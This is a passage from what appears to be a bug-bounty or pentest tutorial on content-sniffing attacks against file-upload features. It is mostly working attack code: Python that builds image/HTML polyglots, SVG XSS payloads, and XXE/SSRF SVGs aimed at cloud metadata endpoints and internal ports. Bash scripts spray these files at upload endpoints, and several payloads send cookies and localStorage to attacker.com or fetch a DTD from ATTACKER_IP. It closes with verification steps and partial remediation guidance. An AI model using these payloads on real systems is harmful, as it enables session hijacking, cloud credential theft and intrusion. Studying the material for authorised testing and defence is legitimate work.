  def jpeg_html_polyglot(output_path, html_payload):
      """Valid JPEG with HTML in COM segment and after EOI"""
      html_bytes = html_payload.encode()
  
      img = Image.new('RGB', (1, 1), 'white')
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=50)
      jpg = buf.getvalue()
  
      # Insert COM segment with HTML after SOI
      com = b'\xff\xfe' + struct.pack('>H', len(html_bytes) + 2) + html_bytes
      polyglot = jpg[:2] + com + jpg[2:]
      # Also append HTML after EOI marker
      polyglot += b'\n' + html_bytes
  
      with open(output_path, 'wb') as f:
          f.write(polyglot)
  
      # Verify it's still valid
      try:
          Image.open(output_path).verify()
          print(f"[+] {output_path} — JPEG+HTML, valid JPEG ✓ ({len(polyglot)} bytes)")
      except:
          print(f"[+] {output_path} — JPEG+HTML ({len(polyglot)} bytes, verify manually)")
  
  def bmp_html_polyglot(output_path, html_payload):
      """BMP header + HTML content"""
      html_bytes = html_payload.encode()
      total = 54 + len(html_bytes)
  
      bmp = b'BM'
      bmp += struct.pack('<I', total)
      bmp += b'\x00\x00\x00\x00'
      bmp += struct.pack('<I', 54)
      bmp += struct.pack('<I', 40)
      bmp += struct.pack('<ii', 1, 1)
      bmp += struct.pack('<HH', 1, 24)
      bmp += b'\x00' * 24
      bmp += html_bytes
  
      with open(output_path, 'wb') as f:
          f.write(bmp)
      print(f"[+] {output_path} — BMP+HTML ({len(bmp)} bytes)")
  
  def pure_html_as_image(output_path, html_payload):
      """Pure HTML content saved with image extension (simplest attack)"""
      with open(output_path, 'w') as f:
          f.write(html_payload)
      print(f"[+] {output_path} — Pure HTML as image ({len(html_payload)} bytes)")
  
  # ── Generate all variants ──
  xss_payload = '''<html><body>
  <script>
  // Content Sniffing XSS PoC
  alert('XSS via Content Sniffing on ' + document.domain);
  document.title = 'SNIFFED_' + document.domain;
  </script>
  <h1>Content Sniffing Proof of Concept</h1>
  <p>Domain: <script>document.write(document.domain)</script></p>
  <p>Cookies: <script>document.write(document.cookie||'(HttpOnly)')</script></p>
  </body></html>'''
  
  steal_payload = '''<html><body style="display:none"><script>
  fetch('https://attacker.com/sniff',{method:'POST',
  body:JSON.stringify({c:document.cookie,d:document.domain,u:location.href,
  ls:JSON.stringify(localStorage)}),mode:'no-cors'});
  </script></body></html>'''
  
  # XSS variants
  gif_html_polyglot('sniff_xss.gif', xss_payload)
  jpeg_html_polyglot('sniff_xss.jpg', xss_payload)
  bmp_html_polyglot('sniff_xss.bmp', xss_payload)
  pure_html_as_image('sniff_xss_pure.jpg', xss_payload)
  
  # Cookie stealer variants
  gif_html_polyglot('sniff_steal.gif', steal_payload)
  jpeg_html_polyglot('sniff_steal.jpg', steal_payload)
  pure_html_as_image('sniff_steal_pure.jpg', steal_payload)
  
  print("\n[*] Upload these files, then open their URLs in a browser")
  print("[*] If HTML renders → Content Sniffing XSS confirmed")
  ```
  :::
::

### Technique 2 — SVG Content Sniffing & Script Execution

SVG files are particularly dangerous because they are **legitimate image files** that **legitimately contain JavaScript**. Even with correct `Content-Type: image/svg+xml`, SVG JavaScript executes when the file is rendered directly.

::tabs
  :::tabs-item{icon="i-lucide-image" label="SVG XSS Payloads"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # ── SVG XSS — Script tag ──
  cat > /tmp/svg_script.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
    <rect width="200" height="200" fill="#e74c3c" rx="10"/>
    <text x="100" y="100" text-anchor="middle" fill="white" font-size="14">Loading...</text>
    <script type="text/javascript">
      // SVG XSS — executes when SVG is viewed directly
      alert('SVG XSS: ' + document.domain);
  
      // Cookie theft
      fetch('https://attacker.com/svg_xss', {
          method: 'POST',
          body: JSON.stringify({
              cookie: document.cookie,
              domain: document.domain,
              url: location.href,
              localStorage: JSON.stringify(localStorage)
          }),
          mode: 'no-cors'
      });
    </script>
  </svg>
  EOF

  # ── SVG XSS — onload event ──
  cat > /tmp/svg_onload.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" 
       onload="alert('SVG onload XSS: '+document.domain)"
       width="100" height="100">
    <circle cx="50" cy="50" r="40" fill="blue"/>
  </svg>
  EOF

  # ── SVG XSS — foreignObject (embeds full HTML/JS) ──
  cat > /tmp/svg_foreign.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
    <foreignObject width="400" height="400">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>
          // Full HTML context inside SVG
          document.title = 'SVG_XSS_' + document.domain;
          fetch('https://attacker.com/svg_foreign', {
              method: 'POST',
              body: JSON.stringify({
                  cookie: document.cookie,
                  domain: document.domain,
                  url: location.href
              }),
              mode: 'no-cors'
          });
        </script>
        <h1 style="color:red">SVG XSS Active</h1>
        <p>Domain: <script>document.write(document.domain)</script></p>
      </body>
    </foreignObject>
  </svg>
  EOF

  # ── SVG XSS — animate event (bypasses script tag filters) ──
  cat > /tmp/svg_animate.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect width="100" height="100" fill="green"/>
    <animate onbegin="alert('animate XSS: '+document.domain)" attributeName="x" dur="1s"/>
    <set attributeName="onmouseover" to="alert('set XSS: '+document.domain)"/>
  </svg>
  EOF

  # ── SVG XSS — xlink href ──
  cat > /tmp/svg_xlink.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPg==#x"/>
  </svg>
  EOF

  # ── SVG XSS — CDATA bypass ──
  cat > /tmp/svg_cdata.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script><![CDATA[alert('CDATA XSS: '+document.domain)]]></script>
    <rect width="100" height="100" fill="orange"/>
  </svg>
  EOF

  # ── SVG XSS — encoded entities ──
  cat > /tmp/svg_encoded.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;</script>
  </svg>
  EOF

  # Upload all SVG payloads
  echo "═══ SVG XSS Upload Spray ═══"
  for f in /tmp/svg_*.svg; do
      NAME=$(basename "$f")
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${f};filename=${NAME};type=image/svg+xml" \
        -H "Cookie: $COOKIE")
      echo "[${STATUS}] ${NAME}"
  done

  # Also try uploading SVG with non-SVG Content-Type (content sniffing)
  echo ""
  echo "─── SVG with spoofed Content-Type ───"
  for ct in "image/jpeg" "image/png" "application/octet-stream" "text/plain" "text/xml"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/svg_script.svg;filename=avatar.svg;type=${ct}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] SVG with CT:${ct} → ACCEPTED"
  done

  # Try with image extension (maximum sniffing dependency)
  for ext in jpg png gif bmp; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/svg_script.svg;filename=image.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] SVG as .${ext} → ACCEPTED (relies on content sniffing)"
  done

  rm -f /tmp/svg_*.svg
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="SVG SSRF & XXE Payloads"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # ── SVG XXE — Read local files ──
  cat > /tmp/svg_xxe_passwd.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">
    <text x="10" y="20" font-family="monospace" font-size="10">&xxe;</text>
  </svg>
  EOF

  # ── SVG SSRF — AWS metadata ──
  cat > /tmp/svg_ssrf_aws.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="50" font-size="14">&xxe;</text>
  </svg>
  EOF

  # ── SVG SSRF — GCP metadata ──
  cat > /tmp/svg_ssrf_gcp.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  EOF

  # ── SVG SSRF — Azure metadata ──
  cat > /tmp/svg_ssrf_azure.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  EOF

  # ── SVG SSRF — Internal port scan ──
  for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
      cat > "/tmp/svg_ssrf_port_${port}.svg" << PORTEOF
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:${port}/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  PORTEOF
  done

  # ── SVG OOB XXE — exfiltrate data via external DTD ──
  cat > /tmp/svg_oob.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&send;</text></svg>
  EOF

  # Upload all
  echo "═══ SVG SSRF/XXE Upload Spray ═══"
  for f in /tmp/svg_ssrf_*.svg /tmp/svg_xxe_*.svg /tmp/svg_oob.svg; do
      [ -f "$f" ] || continue
      NAME=$(basename "$f")
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${f};filename=${NAME};type=image/svg+xml" \
        -H "Cookie: $COOKIE")
      echo "[${STATUS}] ${NAME}"
  done

  rm -f /tmp/svg_ssrf_*.svg /tmp/svg_xxe_*.svg /tmp/svg_oob.svg
  ```
  :::
::

### Technique 3 — Content-Type Confusion Attacks

Different scenarios where the Content-Type served by the server doesn't match the actual content, enabling sniffing.

::tabs
  :::tabs-item{icon="i-lucide-shuffle" label="text/plain Sniffing (IE Target)"}
  ```bash
  # Internet Explorer aggressively sniffs text/plain as text/html
  # This affects IE11, which is still used in enterprise environments

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  cat > /tmp/ie_sniff.txt << 'EOF'
  <html>
  <head><title>IE Content Sniffing XSS</title></head>
  <body>
  <script>
  // Detect IE and execute payload
  if (document.documentMode || /Trident/.test(navigator.userAgent)) {
      // Internet Explorer detected
      alert('IE Content Sniffing XSS on ' + document.domain);

      // Steal NTLM hash via redirect (IE-specific)
      // new Image().src = '\\\\attacker.com\\share';

      // Standard cookie theft
      new Image().src = 'https://attacker.com/ie_xss?c=' +
          encodeURIComponent(document.cookie);
  }
  </script>
  <h1>If you can read this as HTML, your browser is sniffing content.</h1>
  <p>This file is served as text/plain but IE renders it as HTML.</p>
  </body>
  </html>
  EOF

  # Upload as .txt — server will serve as text/plain
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/ie_sniff.txt;filename=report.txt;type=text/plain" \
    -H "Cookie: $COOKIE"

  # Also try .csv (often served as text/plain or text/csv)
  cp /tmp/ie_sniff.txt /tmp/ie_sniff.csv
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/ie_sniff.csv;filename=data_export.csv;type=text/csv" \
    -H "Cookie: $COOKIE"

  # .log extension (often served as text/plain)
  cp /tmp/ie_sniff.txt /tmp/ie_sniff.log
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/ie_sniff.log;filename=debug.log;type=text/plain" \
    -H "Cookie: $COOKIE"

  rm -f /tmp/ie_sniff.txt /tmp/ie_sniff.csv /tmp/ie_sniff.log
  ```
  :::

  :::tabs-item{icon="i-lucide-shuffle" label="application/octet-stream Sniffing"}
  ```bash
  # When Content-Type is application/octet-stream (generic binary),
  # browsers attempt to determine the actual type from content

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  cat > /tmp/octet_sniff.bin << 'EOF'
  <!DOCTYPE html>
  <html>
  <body>
  <script>
  // This executes if browser sniffs octet-stream as HTML
  alert('octet-stream sniffed as HTML: ' + document.domain);
  document.title = 'SNIFFED_OCTET_' + document.domain;

  // Full exploitation
  fetch('https://attacker.com/octet_sniff', {
      method: 'POST',
      body: JSON.stringify({
          cookie: document.cookie,
          domain: document.domain,
          type: 'octet-stream sniffing'
      }),
      mode: 'no-cors'
  });
  </script>
  <h1>Binary Content Sniffing</h1>
  </body>
  </html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/octet_sniff.bin;filename=data.bin;type=application/octet-stream" \
    -H "Cookie: $COOKIE"

  # Try with various "binary" extensions
  for ext in bin dat raw dump backup bak; do
      curl -s -o /dev/null -w "[%{http_code}] .${ext}\n" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/octet_sniff.bin;filename=export.${ext};type=application/octet-stream" \
        -H "Cookie: $COOKIE"
  done

  rm -f /tmp/octet_sniff.bin
  ```
  :::

  :::tabs-item{icon="i-lucide-shuffle" label="Missing Content-Type Sniffing"}
  ```bash
  # When server sends NO Content-Type header at all,
  # browsers ALWAYS sniff the content to determine type
  # This is the most reliable sniffing scenario

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  XSS='<script>alert("no_ct_sniff_"+document.domain)</script>'

  # Upload with unusual extensions that may not have MIME mappings
  for ext in xyz abc test data unknown custom raw dump output result; do
      echo "$XSS" > "/tmp/noct.${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/noct.${ext};filename=file.${ext}" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      if [ "$STATUS" = "200" ]; then
          echo "[+] .${ext} accepted"

          # Check if server sends Content-Type for this extension
          for dir in uploads files media; do
              SERVED_CT=$(curl -sI "https://target.com/${dir}/file.${ext}" 2>/dev/null | \
                          grep -i "^content-type:" | head -1)
              if [ -z "$SERVED_CT" ]; then
                  echo "    [!!!] NO Content-Type header served for .${ext}"
                  echo "    → Browser will ALWAYS sniff → GUARANTEED XSS"
              elif echo "$SERVED_CT" | grep -qi "octet-stream"; then
                  echo "    [!!]  Served as application/octet-stream"
                  echo "    → Browser may sniff as HTML"
              fi
          done
      fi
  done

  rm -f /tmp/noct.*
  ```
  :::
::

### Technique 4 — CDN & Cache-Based Sniffing Attacks

::tabs
  :::tabs-item{icon="i-lucide-cloud" label="CDN Cache Poisoning"}
  ```bash
  # CDN may cache uploaded content with wrong Content-Type
  # or may strip nosniff header during caching
  # This can amplify XSS to affect ALL users

  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"

  echo "═══ CDN Sniffing & Cache Analysis ═══"

  # ── Step 1: Detect CDN presence ──
  HEADERS=$(curl -sI "$TARGET")
  echo "$HEADERS" | grep -iE "x-cache|cf-cache|x-cdn|via|x-served-by|x-amz|x-azure|x-goog|server|age|cf-ray"

  CDN_DETECTED="unknown"
  echo "$HEADERS" | grep -qi "cloudflare" && CDN_DETECTED="Cloudflare"
  echo "$HEADERS" | grep -qi "cloudfront" && CDN_DETECTED="CloudFront"
  echo "$HEADERS" | grep -qi "akamai" && CDN_DETECTED="Akamai"
  echo "$HEADERS" | grep -qi "fastly" && CDN_DETECTED="Fastly"
  echo "$HEADERS" | grep -qi "varnish" && CDN_DETECTED="Varnish"
  echo "[*] CDN: ${CDN_DETECTED}"

  # ── Step 2: Upload HTML as image ──
  MARKER="CDN_SNIFF_$(date +%s)"
  cat > /tmp/cdn_test.jpg << CDNEOF
  <html><script>document.title='${MARKER}'</script>
  <h1>CDN Cache Sniffing Test</h1></html>
  CDNEOF

  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/cdn_test.jpg;filename=cdn_test_${MARKER}.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Step 3: Check how CDN caches the response ──
  sleep 2

  for dir in uploads images media files; do
      FILE_URL="${TARGET}/${dir}/cdn_test_${MARKER}.jpg"

      # First request — origin serves it
      RESP1=$(curl -sI "$FILE_URL" 2>/dev/null)
      CACHE1=$(echo "$RESP1" | grep -iE "x-cache|cf-cache" | head -1 | tr -d '\r')
      CT1=$(echo "$RESP1" | grep -i "^content-type:" | head -1 | tr -d '\r')
      NOSNIFF1=$(echo "$RESP1" | grep -i "x-content-type-options" | head -1 | tr -d '\r')

      if [ -n "$CT1" ]; then
          echo ""
          echo "[*] ${FILE_URL}"
          echo "    Request 1: CT=${CT1}  Cache=${CACHE1:-N/A}  nosniff=${NOSNIFF1:-MISSING}"

          # Second request — CDN serves cached version
          sleep 1
          RESP2=$(curl -sI "$FILE_URL" 2>/dev/null)
          CACHE2=$(echo "$RESP2" | grep -iE "x-cache|cf-cache" | head -1 | tr -d '\r')
          CT2=$(echo "$RESP2" | grep -i "^content-type:" | head -1 | tr -d '\r')
          NOSNIFF2=$(echo "$RESP2" | grep -i "x-content-type-options" | head -1 | tr -d '\r')

          echo "    Request 2: CT=${CT2}  Cache=${CACHE2:-N/A}  nosniff=${NOSNIFF2:-MISSING}"

          # Check if CDN stripped nosniff
          if [ -n "$NOSNIFF1" ] && [ -z "$NOSNIFF2" ]; then
              echo "    [!!!] CDN STRIPPED nosniff header!"
              echo "    → Content sniffing possible through CDN"
          fi

          # Check if CDN changed Content-Type
          if [ "$CT1" != "$CT2" ] && [ -n "$CT2" ]; then
              echo "    [!!]  CDN changed Content-Type"
          fi

          # Check if Cache HIT (affects all users)
          if echo "$CACHE2" | grep -qi "hit"; then
              echo "    [!]   Content is cached by CDN"
              echo "    → If sniffing works, ALL users see XSS (mass impact)"
          fi
      fi
  done

  rm -f /tmp/cdn_test.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud" label="S3 / Blob Storage Sniffing"}
  ```bash
  # S3 buckets and Azure Blob Storage often serve files
  # without proper nosniff headers

  # ── S3 Header Check ──
  S3_BUCKET="target-uploads.s3.amazonaws.com"
  curl -sI "https://${S3_BUCKET}/test.jpg" | grep -iE "content-type|x-content-type|content-disposition|x-amz"

  # S3 serves files with Content-Type set at upload time
  # If application doesn't set Content-Type properly → sniffable

  # ── Test S3 direct upload (if pre-signed URLs used) ──
  # Many apps provide pre-signed S3 URLs for direct upload
  # The Content-Type is set by the CLIENT, not the server

  # If you can control the Content-Type in a pre-signed PUT:
  curl -X PUT "https://target-uploads.s3.amazonaws.com/uploads/evil.html" \
    -H "Content-Type: text/html" \
    --data '<script>alert(document.domain)</script>'

  # Then access it:
  # https://target-uploads.s3.amazonaws.com/uploads/evil.html
  # → Renders as HTML with full JavaScript execution

  # ── Azure Blob Check ──
  AZURE_BLOB="targetaccount.blob.core.windows.net"
  curl -sI "https://${AZURE_BLOB}/uploads/test.jpg" | grep -iE "content-type|x-ms-|content-disposition"

  # ── GCS Check ──
  GCS_BUCKET="storage.googleapis.com/target-bucket"
  curl -sI "https://${GCS_BUCKET}/test.jpg" | grep -iE "content-type|x-goog|content-disposition"
  ```
  :::
::

### Technique 5 — CSP Bypass via Same-Origin Upload

::collapsible

When a Content Security Policy (CSP) includes `script-src 'self'`, scripts loaded from the same origin are allowed. If uploads are served from the same origin, content sniffing can bypass CSP:

```text
CSP: script-src 'self'

Attack chain:
1. Upload HTML/JS file to https://target.com/uploads/evil.jpg
2. Content sniffing renders it as HTML
3. JavaScript executes from https://target.com (same origin as 'self')
4. CSP is satisfied because the script origin matches 'self'
5. Full XSS despite CSP protection

Detection:
- Check if CSP includes 'self' in script-src
- Check if uploads are served from same origin
- If both → CSP bypass via content sniffing

Mitigation:
- Serve uploads from a DIFFERENT origin (e.g., cdn.target.com)
- Add strict CSP on upload serving endpoints:
  Content-Security-Policy: default-src 'none'; style-src 'none'; script-src 'none'
```

```bash
# Check CSP and upload origin
TARGET="https://target.com"

# Get CSP
CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | tr -d '\r')
echo "CSP: ${CSP:-NOT SET}"

# Check if uploads are same-origin
UPLOAD_ORIGIN=$(curl -s -X POST "${TARGET}/api/upload" \
  -F "file=@test.txt;filename=test.txt" \
  -H "Cookie: session=TOKEN" | grep -oP '"url"\s*:\s*"([^"]*)"' | head -1)

echo "Upload URL: ${UPLOAD_ORIGIN}"

if echo "$CSP" | grep -qi "script-src.*'self'" && \
   echo "$UPLOAD_ORIGIN" | grep -q "target.com"; then
    echo "[!!!] CSP bypass possible — uploads same-origin + script-src 'self'"
fi
```

::

---

## Verification & Impact Demonstration

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Browser Verification Workflow"}
  ```text
  ═══ Step-by-Step Browser Verification ═══

  1. Upload the payload via cURL (as shown above)
  2. Get the URL of the uploaded file from the response
  3. Open the URL DIRECTLY in a browser tab (not via <img> tag)

  Verification checklist:

  ── Chrome (latest) ──
  □ Navigate to uploaded file URL
  □ Does HTML render? (Check page title, visible text)
  □ Does alert() fire?
  □ Check DevTools Console for JavaScript execution
  □ Note: Chrome respects nosniff; will NOT sniff if header present

  ── Firefox (latest) ──
  □ Same tests as Chrome
  □ Note: Firefox respects nosniff strictly

  ── Safari (macOS + iOS) ──
  □ More aggressive sniffing than Chrome/Firefox
  □ May render HTML even when Chrome/Firefox don't
  □ IMPORTANT: Test both macOS Safari and iOS Safari

  ── Internet Explorer 11 ──
  □ Most aggressive sniffing — primary target
  □ Will render HTML from text/plain, application/octet-stream
  □ Test in: Standard mode, Compatibility mode, Enterprise mode
  □ Corporate environments often still have IE11

  ── Mobile browsers ──
  □ Android WebView (in-app browsers)
  □ iOS WKWebView
  □ Samsung Internet
  □ Facebook/Instagram/Twitter in-app browser

  Evidence to collect:
  ✓ Screenshot of rendered HTML page (showing domain)
  ✓ Screenshot of alert() popup with document.domain
  ✓ curl -sI showing missing nosniff header
  ✓ Browser name and version where XSS fires
  ✓ Proof that cookies are accessible from the context
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Automated Verification Script"}
  ```bash
  #!/bin/bash
  # verify_sniffing.sh — Verify content sniffing vulnerability

  UPLOADED_URL="${1:?Usage: $0 <uploaded_file_url>}"

  echo "═══ Content Sniffing Verification ═══"
  echo "[*] URL: $UPLOADED_URL"
  echo ""

  # Fetch headers
  HEADERS=$(curl -sI "$UPLOADED_URL" 2>/dev/null)

  CT=$(echo "$HEADERS" | grep -i "^content-type:" | head -1 | tr -d '\r')
  NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | head -1 | tr -d '\r')
  CD=$(echo "$HEADERS" | grep -i "content-disposition" | head -1 | tr -d '\r')
  STATUS=$(echo "$HEADERS" | head -1 | awk '{print $2}')

  echo "HTTP Status:            ${STATUS}"
  echo "Content-Type:           ${CT:-❌ NOT SET}"
  echo "X-Content-Type-Options: ${NOSNIFF:-❌ NOT SET}"
  echo "Content-Disposition:    ${CD:-NOT SET (inline)}"

  # Fetch body
  BODY=$(curl -s "$UPLOADED_URL" 2>/dev/null | head -50)

  echo ""
  echo "─── Content Analysis ───"

  HAS_HTML=0
  HAS_SCRIPT=0

  echo "$BODY" | grep -qiE "<html|<head|<body|<div|<table|<h[1-6]|<!doctype" && HAS_HTML=1
  echo "$BODY" | grep -qiE "<script|onload=|onerror=|onclick=|onmouseover=" && HAS_SCRIPT=1

  [ $HAS_HTML -eq 1 ] && echo "  [+] HTML tags detected in content"
  [ $HAS_SCRIPT -eq 1 ] && echo "  [+] JavaScript/event handlers detected in content"

  echo ""
  echo "─── Vulnerability Assessment ───"

  if [ -z "$NOSNIFF" ] || ! echo "$NOSNIFF" | grep -qi "nosniff"; then
      if [ $HAS_HTML -eq 1 ] || [ $HAS_SCRIPT -eq 1 ]; then
          echo "  [!!!] HIGH CONFIDENCE — Content sniffing XSS likely"
          echo ""
          echo "  Evidence:"
          echo "    1. nosniff header: MISSING"
          echo "    2. HTML/JS content: PRESENT"
          echo "    3. Content-Type: ${CT:-NOT SET}"
          echo ""
          echo "  Affected browsers:"
          [ -z "$CT" ] && echo "    → ALL browsers (no Content-Type = always sniff)"
          echo "$CT" | grep -qi "text/plain" && echo "    → Internet Explorer (sniffs text/plain)"
          echo "$CT" | grep -qi "octet-stream" && echo "    → Most browsers (sniff octet-stream)"
          echo "$CT" | grep -qi "image/" && echo "    → IE11, Safari (may sniff image/* types)"
          echo "    → Test in browser to confirm"
      else
          echo "  [~] nosniff missing but no HTML content in current upload"
          echo "  → Upload HTML content to confirm vulnerability"
      fi
  else
      echo "  [OK] nosniff header present — modern browsers protected"
      echo "  [!]  Still test IE11 (may partially ignore nosniff)"
  fi
  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="Safe PoC for Bug Reports"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TIMESTAMP=$(date +%s)

  # ── Non-malicious proof of concept ──
  cat > /tmp/sniff_poc.jpg << POCEOF
  <!DOCTYPE html>
  <html>
  <head>
  <title>Content Sniffing PoC — ${TIMESTAMP}</title>
  <style>
  body{font-family:monospace;max-width:600px;margin:40px auto;padding:20px;
       background:#1a1a2e;color:#e0e0e0}
  h1{color:#e94560}
  .info{background:#16213e;padding:15px;border-radius:8px;margin:10px 0}
  .label{color:#0f3460;font-weight:bold}
  .value{color:#e94560}
  </style>
  </head>
  <body>
  <h1>🔍 Content Sniffing PoC</h1>
  <p>This file was uploaded as <strong>.jpg</strong> with Content-Type: <strong>image/jpeg</strong></p>
  <p>If you see this as a rendered HTML page, the application is vulnerable to content sniffing.</p>
  <div class="info">
  <p><span class="label">Timestamp:</span> <span class="value">${TIMESTAMP}</span></p>
  <p><span class="label">Domain:</span> <span class="value"><script>document.write(document.domain)</script></span></p>
  <p><span class="label">Origin:</span> <span class="value"><script>document.write(location.origin)</script></span></p>
  <p><span class="label">URL:</span> <span class="value"><script>document.write(location.href)</script></span></p>
  <p><span class="label">Cookie access:</span> <span class="value"><script>document.write(document.cookie?'YES — cookies are accessible':'No cookies visible (HttpOnly or empty)')</script></span></p>
  </div>
  <hr>
  <p style="color:#666;font-size:12px">
  ⚠️ No malicious actions performed. This is a security research PoC.<br>
  Bug Hunter: [YOUR_HANDLE]<br>
  ID: ${TIMESTAMP}
  </p>
  </body>
  </html>
  POCEOF

  # Upload
  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/sniff_poc.jpg;filename=poc_${TIMESTAMP}.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE")

  echo "[*] Upload response: $RESP"

  # Get URL
  FILE_URL=$(echo "$RESP" | grep -oP '"(url|path)"\s*:\s*"([^"]*)"' | \
             grep -oP '"[^"]*"$' | tr -d '"' | head -1)

  # Show headers
  echo ""
  echo "[*] Checking served headers:"
  curl -sI "${FILE_URL:-https://target.com/uploads/poc_${TIMESTAMP}.jpg}" 2>/dev/null | \
    grep -iE "content-type|x-content-type|content-disposition"

  echo ""
  echo "═══ Bug Report Template ═══"
  echo "Title: Stored XSS via Content Sniffing — Missing X-Content-Type-Options: nosniff"
  echo "Severity: High (P2)"
  echo "Endpoint: POST ${UPLOAD_URL##*/}"
  echo "Issue: X-Content-Type-Options: nosniff header is not set on uploaded files"
  echo "Impact: Stored XSS when victim opens uploaded file URL in browser"
  echo "PoC ID: ${TIMESTAMP}"
  echo ""
  echo "Steps:"
  echo "1. Upload poc_${TIMESTAMP}.jpg (HTML content, image/jpeg Content-Type)"
  echo "2. Open uploaded file URL in browser"
  echo "3. Observe HTML renders — JavaScript has access to document.domain and cookies"
  echo ""
  echo "Fix: Add 'X-Content-Type-Options: nosniff' to all responses serving uploaded content"

  rm -f /tmp/sniff_poc.jpg
  ```
  :::
::

---

## Remediation

The defense against content sniffing is straightforward but must be applied consistently across **every response** that serves user-uploaded content.

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: X-Content-Type-Options nosniff
  ---
  Add this header to **every HTTP response**, especially those serving uploaded content. This is the single most important defense against content sniffing.

  ```text
  Apache:  Header always set X-Content-Type-Options "nosniff"
  Nginx:   add_header X-Content-Type-Options "nosniff" always;
  IIS:     <add name="X-Content-Type-Options" value="nosniff"/>
  Express: res.setHeader('X-Content-Type-Options', 'nosniff');
  Django:  SECURE_CONTENT_TYPE_NOSNIFF = True
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Content-Disposition attachment
  ---
  Serve uploaded files with `Content-Disposition: attachment` to force download instead of inline rendering. Even without `nosniff`, this prevents the browser from rendering HTML content.

  ```text
